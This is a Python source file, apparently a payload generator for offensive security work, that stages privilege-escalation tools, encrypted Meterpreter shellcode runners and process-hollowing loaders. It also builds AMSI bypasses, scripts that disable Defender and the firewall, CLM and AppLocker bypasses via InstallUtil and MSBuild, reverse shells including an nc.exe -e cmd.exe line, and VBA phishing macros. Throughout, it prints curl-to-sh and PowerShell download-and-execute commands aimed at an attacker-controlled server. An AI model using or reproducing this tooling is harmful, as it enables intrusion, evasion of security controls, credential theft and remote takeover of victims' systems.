    "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=true /U PsBypassCLM.exe"
  },
    "AddUser.dll": {
    "path": os.path.join(thirdparty_folder, 'AddUser.dll'),
    "outname": obfuscate_name('AddUser.dll'),
    "description": 'Add "rilak" to local administrator, Src: https://github.com/ly4k/SpoolFool/tree/main/AddUser',
    "command": ""
  },
    "nothing.txt": {
    "path": os.path.join(template_folder, 'nothing.txt'),
    "outname": obfuscate_name('nothing.txt'),
    "description": "Nothing",
    "command": ""
  },
    "linpeas.sh": {
    "path": os.path.join(thirdparty_folder, 'linpeas.sh'),
    "outname": obfuscate_name('linpeas.sh'),
    "description": "",
    "command": ""
  },
    "linikatz.sh": {
    "path": os.path.join(thirdparty_folder, 'linikatz.sh'),
    "outname": obfuscate_name('linikatz.sh'),
    "description": "",
    "command": ""
  },
    "linikatzV2.sh": {
    "path": os.path.join(thirdparty_folder, 'linikatzV2.sh'),
    "outname": obfuscate_name('linikatzV2.sh'),
    "description": "https://github.com/Orange-Cyberdefense/LinikatzV2",
    "command": ""
  },
    "pspy64": {
    "path": os.path.join(thirdparty_folder, 'pspy64'),
    "outname": obfuscate_name('pspy64'),
    "description": "https://github.com/DominicBreuker/pspy",
    "command": "./pspy64 -pf -i 1000"
  },
    "PwnKit": {
    "path": os.path.join(thirdparty_folder, 'PwnKit'),
    "outname": obfuscate_name('PwnKit'),
    "description": "https://github.com/ly4k/PwnKit/blob/main/PwnKit",
    "command": "chmod +x PwnKit && ./PwnKit"
  },
    "PwnKit32": {
    "path": os.path.join(thirdparty_folder, 'PwnKit32'),
    "outname": obfuscate_name('PwnKit32'),
    "description": "https://github.com/ly4k/PwnKit/blob/main/PwnKit",
    "command": "chmod +x PwnKit32 && ./PwnKit32"
  },
    "dirtypipez": {
    "path": os.path.join(thirdparty_folder, 'dirtypipez'),
    "outname": obfuscate_name('dirtypipez'),
    "description": "https://haxx.in/files/dirtypipez.c",
    "command": "chmod +x dirtypipez && ./dirtypipez /usr/bin/sudo"
  },
    "BadPotato.exe": {
    "path": os.path.join(thirdparty_folder, 'BadPotato.exe'),
    "outname": obfuscate_name('BadPotato.exe'),
    "description": "",
    "command": ""
  },
    "GodPotato-NET2.exe": {
    "path": os.path.join(thirdparty_folder, 'GodPotato-NET2.exe'),
    "outname": obfuscate_name('GodPotato-NET2.exe'),
    "description": "",
    "command": 'GodPotato-NET2.exe -cmd "cmd /c whoami"'
  },
    "GodPotato-NET35.exe": {
    "path": os.path.join(thirdparty_folder, 'GodPotato-NET35.exe'),
    "outname": obfuscate_name('GodPotato-NET35.exe'),
    "description": "",
    "command": 'GodPotato-NET35.exe -cmd "cmd /c whoami"'
  },
    "GodPotato-NET4.exe": {
    "path": os.path.join(thirdparty_folder, 'GodPotato-NET4.exe'),
    "outname": obfuscate_name('GodPotato-NET4.exe'),
    "description": "",
    "command": 'GodPotato-NET4.exe -cmd "cmd /c whoami"'
  },
    "GodPotato-NET4.5.1.exe": {
    "path": os.path.join(thirdparty_folder, 'GodPotato-NET4.5.1.exe'),
    "outname": obfuscate_name('GodPotato-NET4.5.1.exe'),
    "description": "",
    "command": 'GodPotato-NET4.5.1.exe -cmd "cmd /c whoami"'
  },
    "nc.exe": {
    "path": os.path.join(thirdparty_folder, 'nc.exe'),
    "outname": obfuscate_name('nc.exe'),
    "description": "",
    "command": 'nc.exe -t -e C:\Windows\System32\cmd.exe IP PORT'
  },
    "chisel.exe": {
    "path": os.path.join(thirdparty_folder, 'chisel.exe'),
    "outname": obfuscate_name('chisel.exe'),
    "description": "",
    "command": ''
  },
    "chisel": {
    "path": os.path.join(thirdparty_folder, 'chisel'),
    "outname": obfuscate_name('chisel'),
    "description": "",
    "command": ''
  },
    "mssqlclient.exe": {
    "path": os.path.join(tools_folder, 'mssqlclient.exe'),
    "outname": obfuscate_name('mssqlclient.exe'),
    "description": "",
    "command": ''
  },
    "mssqlcmd.exe": {
    "path": os.path.join(tools_folder, 'mssqlcmd.exe'),
    "outname": obfuscate_name('mssqlcmd.exe'),
    "description": "",
    "command": ''
  },
    "RdpThief.dll": {
    "path": os.path.join(thirdparty_folder, 'RdpThief.dll'),
    "outname": obfuscate_name('RdpThief.dll'),
    "description": "https://github.com/0x09AL/RdpThief",
    "command": ''
  },
    "adduser.sh": {
    "path": os.path.join(tools_folder, 'adduser.sh'),
    "outname": obfuscate_name('adduser.sh'),
    "description": "",
    "command": ''
  },
    "RunasCs.exe": {
    "path": os.path.join(thirdparty_folder, 'RunasCs.exe'),
    "outname": obfuscate_name('RunasCs.exe'),
    "description": "https://github.com/antonioCoco/RunasCs",
    "command": 'RunasCs.exe <username> <password> "cmd /c whoami /all"'
  },
    "RDPThiefInject.exe": {
    "path": os.path.join(thirdparty_folder, 'RDPThiefInject.exe'),
    "outname": obfuscate_name('RDPThiefInject.exe'),
    "description": "https://github.com/Bu4275/RDPThiefInject",
    "command": ''
  },
    "lat.exe": {
    "path": os.path.join(tools_folder, 'lat.exe'),
    "outname": obfuscate_name('lat.exe'),
    "description": "src/lat.cs",
    "command": ''
  },
    "SharpSQLTools.exe": {
    "path": os.path.join(thirdparty_folder, 'SharpSQLTools.exe'),
    "outname": obfuscate_name('SharpSQLTools.exe'),
    "description": "https://github.com/uknowsec/SharpSQLTools",
    "command": ''
  },
}

# Host executable files
for filename in host_files:
    
    fullpath = host_files[filename]['path']

    if "outname" in host_files[filename]:
        outname = host_files[filename]['outname']
    else:
        outname = filename

    copy_to_outfolder(fullpath, outname)
    if filename.split('.')[-1] == 'sh':
        download_command = 'curl -L %s | sh' % (http_server_url + '/' + filename)
        download_command += f'\n\twget {http_server_url}/{filename} -O /tmp/{filename} && chmod +x /tmp/{filename} && /tmp/{filename}'
    elif len(filename.split('.')) == 1:
        download_command = 'wget %s -O %s' % ((http_server_url + '/' + filename), filename)
    else:
        download_command = windows_download_command(http_ip, http_port, filename)

    write_md(filename, download_command)
    print('[*] File: %s' % filename)
    if verbose:
        print('\tDescription: %s' % host_files[filename]['description'])
    print('\t%s' % download_command)
    if host_files[filename]['command'] != "":
        print('\t%s\n' % host_files[filename]['command'].replace(filename, outname))
    else:
        print('')

print('[*] PwnKit.sh')
out_file = 'PwnKit.sh'
template_replace('PwnKit.sh', out_file, {'http_server_url': http_server_url})
command = 'sh -c "$(curl -fsSL %s/PwnKit.sh)"' % http_server_url
print('\t%s\n' % command)
write_md('PwnKit.sh', command)

# Raw shellcode
with open(metepreter_shellcode, 'rb') as f:
    shellcode_raw = f.read()

    # Base64 AES shellcode
    b64_aes_shellcode = aes_encrypt_file_to_base64(aes_key, aes_iv, metepreter_shellcode)
    shellcode_file_b64_aes = 'aes_shell.bin'
    with open(os.path.join(out_folder, shellcode_file_b64_aes), 'w') as fw:
        fw.write(b64_aes_shellcode)

with open(metepreter_shellcode_linux, 'rb') as f:
    raw_shellcode_linux = f.read()

# Buffer array in different code format
raw_buf_code = to_buf(shellcode_raw)


# PS1 Disable PPL
print('[*] PS1 Disable PPL')
out_file = 'disable_ppl.ps1'
mimikatz_ps_file = powershell_files['Invoke-Mimikatz.ps1']['outname']
mimidrv_file = host_files['mimidrv.sys']['outname']
template_replace('disable_ppl.ps1', out_file, {'http_ip': http_ip, 'http_port': str(http_port), 'mimikatz': mimikatz_ps_file, 'save_path': 'C:\\\\windows\\\\tasks\\\\', 'service_name': random_str(6), 'mimidrv': mimidrv_file})
command = to_ps_iwr(http_server_url, out_file, in_powershell=True)
print('\t%s\n' % command)
write_md('Import disable_ppl.ps1', command)



# PS1 Bypass AMSI + Disable Defender
print('[*] Bypass AMSI + Disable Defender + Disable Firewall')
out_file = 'adf.ps1'
bypass_amsi_ps1_file = powershell_files['amsi_bypass.ps1']['outname']
disable_defender_and_firewall_ps_file = powershell_files['disable_all.ps1']['outname']
command = make_load_mutil_powershell_in_on_file(http_server_url, [bypass_amsi_ps1_file, disable_defender_and_firewall_ps_file], out_file, base64encoded=False)
print(f'\t%s\n' % command)
write_md('Bypass AMSI + Disable Defender + Disable Firewall', command)


# PS1 powershell -> AES Encryption load dll -> Patch ScanBuffer
print('[*] Dll Bypass AMSI')
cs_file = 'bypass_amsi.cs'
template_replace(cs_file, cs_file, {})
compiled_file = 'ad.dll'
compile_cs_in_out_folder(cs_file, compiled_file, to_dll=True)
ps_file = 'bypass_amsi_using_dll.ps1'
wrap_and_enc_exe_to_ps1(compiled_file, 'AM', 'PA', '', ps_file, aes_key, aes_iv)
print(f'\t%s\n' % to_ps_iwr(http_server_url, ps_file, base64encoded=base64_powershell))

# ----------------------------------------------------
# Shellcode Runner
print_title('Shellcode Runner')
print('[*] PS1 shellcode runner -> Embedded:shellcode')
shellcode_runner_ps1_file = obfuscate_name(MyPayloadFile.ps1)
template_replace('shellcode_runner.ps1',
                 shellcode_runner_ps1_file, 
                 {'shellcode': raw_buf_code[BufFormat.POWERSHELL], 'code': ''})
print(f'\t%s\n' % to_ps_iwr(http_server_url, [bypass_amsi_ps1_file ,shellcode_runner_ps1_file], base64encoded=base64_powershell))

# Bypass AMSI + Shellcode Runner
print('[*] PS1 Bypass AMSI + shellcode runner -> Embedded:shellcode')
amsi_and_shellcode_runner_ps1_file = obfuscate_name(MyPayloadFile.amsi_shell)
template_replace('code.txt',
            amsi_and_shellcode_runner_ps1_file,
            {'code': to_ps_iwr(http_server_url, [bypass_amsi_ps1_file, shellcode_runner_ps1_file], in_powershell=True)})
command = to_ps_iwr(http_server_url, amsi_and_shellcode_runner_ps1_file)
command_b64 = to_ps_iwr(http_server_url, amsi_and_shellcode_runner_ps1_file, base64encoded=True)
print(f'\t%s' % command)
print(f'\t%s\n' % command_b64)
write_md('Bypass AMSI & shellcode runner', command)
write_md('Bypass AMSI & shellcode runner B64', command_b64)


# Bypass AMSI + shellcode Runner + Remote:AES(shellcode)
print('[*] PS1 Bypass AMSI + shellcode runner -> Remote:AES(shellcode)')
shellcode_runner_remote_aes_ps1_file = obfuscate_name('sar.ps1')
template_replace('shellcode_runner_remote_aes.ps1',
                 shellcode_runner_remote_aes_ps1_file, 
                 {'ase_shellcode_url': http_server_url + '/' + shellcode_file_b64_aes, 'aes_key': aes_key, 'aes_iv': aes_iv})
amsi_shellcode_runner_remote_aes_ps1_file = MyPayloadFile.amsi_sr_remote_aesshell
command = make_load_mutil_powershell_in_on_file(http_server_url, [bypass_amsi_ps1_file, shellcode_runner_remote_aes_ps1_file], amsi_shellcode_runner_remote_aes_ps1_file, base64encoded=False)
command_b64 = make_load_mutil_powershell_in_on_file(http_server_url, [bypass_amsi_ps1_file, shellcode_runner_remote_aes_ps1_file], amsi_shellcode_runner_remote_aes_ps1_file, base64encoded=True)
print(f'\t%s' % command)
print(f'\t%s\n' % command_b64)
write_md('Bypass AMSI & shellcode runner (Remote, AES)', command)
write_md('Bypass AMSI & shellcode runner (Remote, AES) B64', command_b64)

# Bypass AMSI + b64(shellcode Runner) + Embedded:AES(shellcode)
print('[*] PS1 Bypass AMSI + shellcode runner -> Embedded:AES(shellcode)')
shellcode_runner_local_ase_ps1_file = obfuscate_name('sal.ps1')
template_replace('shellcode_runner_local_aes.ps1',
                 shellcode_runner_local_ase_ps1_file, 
                 {'b64_aes_shellcode': b64_aes_shellcode, 'aes_key': aes_key, 'aes_iv': aes_iv})
amsi_shellcode_runner_local_aes_ps1_file = MyPayloadFile.amsi_sr_local_aesshell
command = make_load_mutil_powershell_in_on_file(http_server_url, [bypass_amsi_ps1_file, shellcode_runner_local_ase_ps1_file], amsi_shellcode_runner_local_aes_ps1_file, base64encoded=False)
command_b64 = make_load_mutil_powershell_in_on_file(http_server_url, [bypass_amsi_ps1_file, shellcode_runner_local_ase_ps1_file], amsi_shellcode_runner_local_aes_ps1_file, base64encoded=True)
print(f'\t%s' % command)
print(f'\t%s\n' % command_b64)
write_md('Bypass AMSI & shellcode runner (Local, AES)', command)
write_md('Bypass AMSI & shellcode runner (Local, AES) B64', command_b64)

# Bypass AMSI + b64(shellcode Runner) + Remote:AES(shellcode)
print('[*] PS1 Bypass AMSI + b64(shellcode runner) -> Remote:AES(shellcode)')
b64_shellcode_runner_remote_aes_ps1_file = 'b64sar.ps1' # b64(shellcode runner)
with open(output_path(b64_shellcode_runner_remote_aes_ps1_file), 'w') as f:
    f.write(convert_file_to_base64(output_path(shellcode_runner_remote_aes_ps1_file)))
command = to_ps_iwr(http_server_url, MyPayloadFile.amsi, in_powershell=True)
command += to_ps_iwr(http_server_url, b64_shellcode_runner_remote_aes_ps1_file, in_powershell=True, load_ps_from_base64=True)
with open(output_path(MyPayloadFile.amsi_b64sr_remote_aesshell), 'w') as f:
    f.write(command)
command = to_ps_iwr(http_server_url, MyPayloadFile.amsi_b64sr_remote_aesshell)
print('\t%s\n' % command)

# Bypass AMSI + CX(shellcode Runner + CX(shellcode)
print('[*] PS1 Bypass AMSI + CX(shellcode Runner -> Remote:CX(shellcode) )')

# CX shellcode
caesar_xor_shellcode = cxencoder.cxencode(shellcode_raw)
caesar_xor_shellcode_file = obfuscate_name('cxsh.bin') # CX(shellcode)
with open(output_path(caesar_xor_shellcode_file), 'wb') as f:
    f.write(caesar_xor_shellcode)

# Insert CX(shellcode) to shellcode runner
tmp_shellcode_runner_ps = 'cxs.ps1' # shellcode runner 
code = cxencoder.powershell
data = template_replace('shellcode_runner_remote.ps1', tmp_shellcode_runner_ps, {'url': http_server_url + '/' + caesar_xor_shellcode_file, 
                                                                                 'code': code })

# CX shellcode runner
data = cxencoder.cxencode(data.encode('utf-8'))
caesar_xor_shellcode_runner_ps1 = obfuscate_name('cxsr') # CX(shellcode runner)
with open(output_path(caesar_xor_shellcode_runner_ps1), 'wb') as f:
    f.write(data)

# Create CX(shellcode runner) loader
load_cxshell_ps1_file = obfuscate_name('lcxsr.ps1') # CX(shellcode)
template_replace('load_encoded_shellcoder_runner.ps1', load_cxshell_ps1_file, 
                    {'url': http_server_url + '/' + caesar_xor_shellcode_runner_ps1, 
                     'code': cxencoder.powershell})

# Load Bypass AMSI & CX(shellcode runner) loader
make_load_mutil_powershell_in_on_file(http_server_url, [bypass_amsi_ps1_file, load_cxshell_ps1_file], MyPayloadFile.amsi_cxsr_remote_cxshell)
command = to_ps_iwr(http_server_url, MyPayloadFile.amsi_cxsr_remote_cxshell)
command_b64 = to_ps_iwr(http_server_url, MyPayloadFile.amsi_cxsr_remote_cxshell, in_powershell=False, base64encoded=True)
print('\t%s' % command)
print('\t%s\n' % command_b64)
write_md('cxshell', command)
write_md('cxshell (b64)', command_b64)

if args.ps is not None:
    shellcode_entry_ps1_file = args.ps
else:
    shellcode_entry_ps1_file = amsi_shellcode_runner_remote_aes_ps1_file

# ----------------------------------------------------
print_title('Potato + Shellcode Runner')
print('[*] PS1 Bypass AMSI + Badpotato(Payload)')
# BadPotato + Payload
badpotato_shellcode_runner_ps1_file = 'bads.ps1'
with open(os.path.join(thirdparty_folder, 'BadPotato.ps1'), 'r') as f:
    data = f.read()
with open(os.path.join(out_folder, badpotato_shellcode_runner_ps1_file), 'w') as f:
    f.write(data + '\n' + "Invoke-BadPotato '%s'" % to_ps_iwr(http_server_url, [MyPayloadFile.bypass_clm_amsi_shell], base64encoded=True)) # Payload here

# Bypass AMSI + Badpotato + Payload
out_file = MyPayloadFile.amsi_badpotato_shell
command = make_load_mutil_powershell_in_on_file(http_server_url, [MyPayloadFile.amsi_scanbuffer, badpotato_shellcode_runner_ps1_file], out_file)
command_b64 = make_load_mutil_powershell_in_on_file(http_server_url, [MyPayloadFile.amsi_scanbuffer, badpotato_shellcode_runner_ps1_file], out_file, base64encoded=True)
print(f'\t%s' % command)
print(f'\t%s\n' % command_b64)
write_md('BadPotato + AMSI + Shellcode', command)
write_md('BadPotato + AMSI + Shellcode (b64)', command_b64)


print('[*] PS1 Bypass AMSI + GodPotato -> Payload')
# GodPotato + Payload
godpotato_shellcode_runner_ps1_file = 'gs.ps1'
with open(os.path.join(thirdparty_folder, 'GodPotato.ps1'), 'r') as f:
    data = f.read()
with open(output_path(godpotato_shellcode_runner_ps1_file), 'w') as f:
    f.write(data + '\n' + "Invoke-GodPotato -cmd '%s'" % to_ps_iwr(http_server_url, MyPayloadFile.bypass_clm_amsi_shell, base64encoded=True)) # Payload here

# Bypass AMSI + GodPotato + Payload
out_file = MyPayloadFile.amsi_godpotato_shell
command = make_load_mutil_powershell_in_on_file(http_server_url, [MyPayloadFile.amsi_scanbuffer, godpotato_shellcode_runner_ps1_file], out_file)
command_b64 = make_load_mutil_powershell_in_on_file(http_server_url, [MyPayloadFile.amsi_scanbuffer, godpotato_shellcode_runner_ps1_file], out_file, base64encoded=True)
print(f'\t%s' % command)
print(f'\t%s\n' % command_b64)
write_md('GodPotato + AMSI + Shellcode', command)
write_md('GodPotato + AMSI + Shellcode (b64)', command_b64)

print_title('Some file for testing. (cannot bypass defender)')
# EXE shellcode_runner_aes.exe
print('[*] EXE shellcode_runner_aes.exe')
cs_file = 'shellcode_runner_aes.cs'
out_file = 'shellaes.exe'
template_replace(cs_file, cs_file, {'b64_aes_shellcode': b64_aes_shellcode, 'aes_key': aes_key, 'aes_iv': aes_iv})
compile_cs_in_out_folder(cs_file, out_file)
print(f'\tFile: %s' % out_file)
command = windows_download_command(http_ip, http_port, out_file)
print('\t%s\n' % command)


# Process Hollowing
### Generate process_hollowing.cs
print('[*] PS1 process_hollowing.exe')
cs_file = 'process_hollowing.cs'
process_hollowing_exe_file = 'process_hollowing.exe'
template_replace(cs_file, cs_file, {'shellcode': raw_buf_code[BufFormat.CSHARP]})
### Compile process_hollowing.cs
compile_cs_in_out_folder(cs_file, process_hollowing_exe_file)
### Insert process_hollowing.exe to ps1
out_file = 'load_ph_exe.ps1'
wrap_exe_to_ps1(process_hollowing_exe_file, 'HelloWorld', 'Main', '$args', out_file)
print('\t%s\n' % to_ps_iwr(http_server_url, [bypass_amsi_ps1_file, out_file], base64encoded=base64_powershell))


# PowerShell: powershell -> aes_process_hollowing -> shelcoode
print('[*] PS1 powershell -> aes_process_hollowing -> shelcoode')
### Insert Encrypted process_hollowing.exe to ps1
out_file = obfuscate_name('load_aes_ph_exe.ps1')
wrap_and_enc_exe_to_ps1(process_hollowing_exe_file, 'HelloWorld', 'Main', '$args', out_file, aes_key, aes_iv)
print('\t%s\n' % to_ps_iwr(http_server_url, [bypass_amsi_ps1_file, out_file], base64encoded=base64_powershell))

# PowerShell: powershell -> process_hollowing -> aes_shelcoode
### Generate process_hollowing_aes_shellcode.cs
print('[*] PS1 powershell -> process_hollowing -> aes_shelcoode')
### Insert aes shellcode into cs file
cs_file = 'process_hollowing_aes_shellcode.cs'
process_hollowing_aes_shellcode_exe_file = 'process_hollowing_aes.exe'
template_replace(cs_file, 
                 cs_file, 
                 {'b64_aes_shellcode': b64_aes_shellcode, 'aes_key': aes_key, 'aes_iv': aes_iv})
### Compile process_hollowing_aes.exe
compile_cs_in_out_folder(cs_file, process_hollowing_aes_shellcode_exe_file)
### Insert process_hollowing_aes_exe to ps1
out_file = obfuscate_name('load_ph_aes_exe.ps1')
wrap_exe_to_ps1(process_hollowing_aes_shellcode_exe_file, 'HelloWorld', 'Main', '$args', out_file)
print('\t%s\n' % to_ps_iwr(http_server_url, [bypass_amsi_ps1_file, out_file], base64encoded=base64_powershell))


# PowerShell: powershell -> aes_process_hollowing -> aes_shelcoode
print('[*] PS1 powershell -> aes_process_hollowing -> aes_shelcoode')
### Insert base64  aes process_hollowing_aes.exe to load_aes_exe.ps1
out_file = obfuscate_name('load_aes_ph_aes_exe.ps1')
wrap_and_enc_exe_to_ps1(process_hollowing_aes_shellcode_exe_file, 'HelloWorld', 'Main', '$args', out_file, aes_key, aes_iv)
print('\t%s\n' % to_ps_iwr(http_server_url, [bypass_amsi_ps1_file, out_file], base64encoded=base64_powershell))


# ----------------------------------------------------
print_title('CLM Bypass')

### EXE: bypass_clm.exe
print(f'[*] CLM Bypass: Load remote shellcode_runner.ps1')
cs_file = 'bypass_clm_cxshell.cs'
exe_file = 'bypass_clm_cxshell.exe'

template_replace('bypass_clm.cs',
                 cs_file,
                {'code': to_ps_iwr(http_server_url, [MyPayloadFile.amsi_cxsr_remote_cxshell], in_powershell=True, base64encoded=base64_powershell)})
### Compile bypass_clm.exe
command = windows_download_command(http_ip, http_port, exe_file)
print(f'\t%s\n' % command)
write_md('bypass_clm_cxshell.exe', command)

compile_cs_in_out_folder(cs_file, exe_file)
### ps1: CLM Bypass shellcode_runner.ps1(Remote)
print('[*] PS1 CLM Bypass: Load bypass_clm_cxshell.exe -> Load remote shellcode_runner.ps1 (Chooses x86 in macro)')
out_file = obfuscate_name('bypass_clm_cxshell.ps1')
b64_exe = convert_file_to_base64(output_path(exe_file))
wrap_exe_to_ps1(exe_file, 'HelloWorld', 'Main', '$args', out_file)
command = to_ps_iwr(http_server_url, out_file, base64encoded=base64_powershell)
print('\t%s\n' % command)
write_md('bypass_clm_cxshell.ps1', command)

# ----------------------------------------------------
print_title('CLM Bypass and AppLocker Bypass')

# EXE (Test)CLM Bypass with InstallUtil (Test)
print('[*] EXE (Test)CLM Bypass with InstallUtil (Test): Write LanguageMode to test.txt')
cs_file = 'bypass_clm_installutil_check.cs'
exe_file = 'bypass_clm_installutil_check.exe'
template_replace(cs_file, 
                cs_file)
print(f'\tFile: {exe_file}\n')
compile_cs_in_out_folder(cs_file, exe_file)

print('[*] PS1 (Test)CLM Bypass with InstallUtil script: InstallUtil -> bypass_clm_installutil_check.exe -> check clm -> Write LanguageMode to test.txt')
ps1_file = 'bypass_clm_installutil_check.ps1'
template_replace('load_installutil.ps1',
                ps1_file,
                {'http_server_url': http_server_url, 'filename_exe': exe_file})

print('\t%s\n' % to_ps_iwr(http_server_url, ps1_file, base64encoded=base64_powershell))


print('[*] EXE CLM Bypass with InstallUtil: InstallUtil -> CLM Bypass -> Payload')
cs_template = 'bypass_clm_installutil.cs'
cs_file = 'bypass_clm_with_installutil.cs'
installutil_dropper_exe = obfuscate_name('bypass_clm_with_installutil.exe', ext='.exe')
template_replace(cs_template, 
                cs_file, 
                {'code': to_ps_iwr(http_server_url, [MyPayloadFile.amsi_cxsr_remote_cxshell], in_powershell=True)}) # Change payload here
compile_cs_in_out_folder(cs_file, installutil_dropper_exe)
print('\t%s' % certutil_download_command(http_server_url, installutil_dropper_exe))
print(f'\t"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe" /logfile= /LogToConsole=true /U {installutil_dropper_exe}\n')

print('[*] PS1 CLM Bypass with InstallUtil: Download EXE -> InstallUtil -> CLM Bypass -> Payload')
installutil_dropper_ps1 = MyPayloadFile.bypass_clm_amsi_shell
template_replace('load_installutil.ps1',
                installutil_dropper_ps1,
                {'http_server_url': http_server_url, 'filename_exe': installutil_dropper_exe})
command = to_ps_iwr(http_server_url, installutil_dropper_ps1, base64encoded=base64_powershell, in_powershell=True)
command_b64 = to_ps_iwr(http_server_url, installutil_dropper_ps1, base64encoded=True, in_powershell=False)
print('\t%s' % command)
print('\t%s\n' % command_b64)
write_md('clm.ps1', command)
write_md('clm.ps1 (b64)', command_b64)

### PsBypassCLM.ps1 https://github.com/padovah4ck/PSByPassCLM
print('[*] PsBypassCLM.ps1: Load PsBypassCLM.exe using InstallUtil.exe')
out_file = obfuscate_name('PsBypassCLM.ps1')
template_replace('load_installutil.ps1',
                out_file,
                {'http_server_url': http_server_url, 'filename_exe': host_files['PsBypassCLM.exe']['outname']})
command = to_ps_iwr(http_server_url, out_file, base64encoded=base64_powershell, in_powershell=True)
print('\t%s\n' % command)
write_md('PsBypassCLM.ps1', command)

print('[*] PS1 CLM Bypass with InstallUtil (b64): Download b64(EXE) -> InstallUtil -> CLM Bypass -> Payload')
b64_installutil_exe_file = 'b64_installutil.txt'
b64_exe = convert_file_to_base64(output_path(installutil_dropper_exe))
certutil_b64 = convert_to_certutil_b64_format(b64_exe)
### Write to txt
with open(output_path(b64_installutil_exe_file), 'w') as f:
    f.write(certutil_b64)
### Load certutil's base64 with powershell
bypass_clm_with_installutil_b64_ps1 = obfuscate_name('bypass_clm_with_installutil_b64.ps1')
template_replace('load_b64_installutil.ps1',
                 bypass_clm_with_installutil_b64_ps1,
                 {'ip': http_ip, 'filename': b64_installutil_exe_file})
print('\t%s\n' % to_ps_iwr(http_server_url, bypass_clm_with_installutil_b64_ps1, base64encoded=base64_powershell, in_powershell=True))


print('[*] PS1 CLM Bypass with InstallUtil: Invoke-Installutil')
print('\t%s\n' % to_ps_iwr(http_server_url, powershell_files['Invoke-Installutil-A.ps1']['outname'], append_command="Invoke-Installutil '$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath aaa.txt'", in_powershell=True))


print('[*] PS1 CLM Bypass with InstallUtil: reverse_tcp, on port %s' % str(nc_port))
out_file = 'reverse_tcp.ps1'
payload = template_replace('reverse_tcp.ps1', out_file, {'ip': met_ip, 'port': str(nc_port)})
out_file = 'clm_rev.ps1'
template_replace('bypass_clm_installutil_rev.ps1', out_file, {'payload': payload})
print('\t%s\n' % to_ps_iwr(http_server_url, out_file, in_powershell=True))


'''
print('[*] PS1 ReflectivePEInjection (Inject Meterpreter DLL to explorer.exe)')
Invoke_ReflectivePEInjection_ps1 = obfuscate_name('Invoke-ReflectivePEInjection.ps1')
template_replace('Invoke-ReflectivePEInjection.ps1', Invoke_ReflectivePEInjection_ps1)
reflective_injection_payload = "$bytes = (New-Object System.Net.WebClient).DownloadData('{http_server_url}/{metepreter_dll}');(New-Object System.Net.WebClient).DownloadString('{http_server_url}/{Invoke_ReflectivePEInjection_ps1}') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid"
reflective_injection_payload = reflective_injection_payload.format(http_server_url=http_server_url, metepreter_dll=metepreter_dll, Invoke_ReflectivePEInjection_ps1=Invoke_ReflectivePEInjection_ps1)
print("\t%s\n" % reflective_injection_payload)

# CLM Bypass with InstallUtil & SehllcodeRunner: InstallUtil -> CLM Bypass -> AMSI Bypass(Remote) -> shellcode runner(Remote)
print('[*] EXE CLM Bypass with InstallUtil & Sehllcode: InstallUtil -> CLM Bypass -> AMSI Bypass(Remote) -> shellcode runner(Remote)')
cs_template = 'bypass_clm_installutil.cs'
cs_file = 'bypass_clm_with_installutil_reflective_injection.cs'
installutil_dropper_reflective_injection_exe = obfuscate_name('bypass_clm_with_installutil_reflective_injection.exe', ext='.exe')
template_replace(cs_template, 
             cs_file, 
             {'code': reflective_injection_payload})
compile_cs_in_out_folder(cs_file, installutil_dropper_reflective_injection_exe)
print('\t%s\n' % installutil_dropper_reflective_injection_exe)

### PS1
print('[*] PS1 CLM Bypass with InstallUtil & ReflectiveInjction: InstallUtil -> CLM Bypass -> Reflective Injection')
installutil_reflective_injection_ps1 = obfuscate_name('installutil_reflective_injection.ps1')
template_replace('load_installutil.ps1',
             installutil_reflective_injection_ps1,
             {'http_server_url': http_server_url, 'filename_exe': installutil_dropper_reflective_injection_exe})
payload = to_ps_iwr(http_server_url, installutil_reflective_injection_ps1)
print('\t%s\n' % payload)
'''

### PS1 MSBuild
print('[*] PS1 Bypass with MSBuild & ShllcodeRunner: MSbuild -> CLM Bypass ->  amsi_bypass.p1 ->  shellcode_runner.ps1')
bypass_clm_msbuild_ps = obfuscate_name('bypass_clm_msbuild.ps1')
template_replace('bypass_clm_msbuild.ps1',
             bypass_clm_msbuild_ps,
             {'ps_code': to_ps_iwr(http_server_url, [bypass_amsi_ps1_file, shellcode_runner_ps1_file], in_powershell=True)})
payload = to_ps_iwr(http_server_url, bypass_clm_msbuild_ps, base64encoded=base64_powershell)
print('\t%s\n' % payload)

### CMD MSBuild
print('[*] XMO CLM Bypass with MSBuild: MSbuild -> CLM Bypass -> load amsi_bypass.ps1 -> load shellcode_runner.ps1')
bypass_clm_msbuild_xml = obfuscate_name('bypass_clm_msbuild.xml')
template_replace('msbuild.xml',
             bypass_clm_msbuild_xml,
             {'ps_code': to_ps_iwr(http_server_url, [bypass_amsi_ps1_file, shellcode_runner_ps1_file], in_powershell=True)})
print("\tUsage: ")
print('\t%s' % certutil_download_command(http_server_url, bypass_clm_msbuild_xml))
print("\tc:\\windows\\microsoft.net\\framework64\\v4.0.30319\\msbuild.exe %s\n" % bypass_clm_msbuild_xml)



# ----------------------------------------------------
print_title("Phishing")

# Macro: shellcode_runner.vb
print('[*] Macro: shellcode_runner.vb')
shellcode = raw_buf_code[BufFormat.VB]
out_file = 'macro_shellcode_runner.vb'
template_replace(os.path.join(template_folder, 'shellcode_runner.vb'), 
                 out_file,
                 {'shellcode': shellcode, 'code': ''})
print(f'\tFile: {out_file}\n')

# Macro: shellcode_runner_caesar.vb (caesar)
print('[*] Macro: shellcode_runner_caesar.vb')
shellcode_caesar_add_5 =  to_buf(MyEncoder.caesar_vb(shellcode_raw, CAESAR_NUM))['vb']
out_file = 'macro_shellcode_runner_caesar.vb'
code = '''For i = 0 To UBound(buf)
buf(i) = buf(i) - %s
Next i''' % str(CAESAR_NUM)

template_replace(os.path.join(template_folder, 'shellcode_runner.vb'), 
                 out_file,
                 {'shellcode': shellcode_caesar_add_5, 'code': code})
print(f'\tFile: {out_file}\n')


# Macro: Load shellcode_runner.ps1
print('[*] Macro: Load remote ps1: Bypass AMSI + Shellcode Runner')
cmd = to_ps_iwr(http_server_url, [MyPayloadFile.amsi_shell])
out_file = 'macro_powershell.vb'
template_replace('powershell.vb',
                 out_file,
                 {'cmd': cmd})
print(f'\tFile: {out_file}\n')

print('[*] Macro Load remote ps1: Bypass CLM with Installutil: Download EXE -> InstallUtil -> CLM Bypass -> Payload')
out_file = obfuscate_name('macro_bypass_clm_with_installutil.vb')
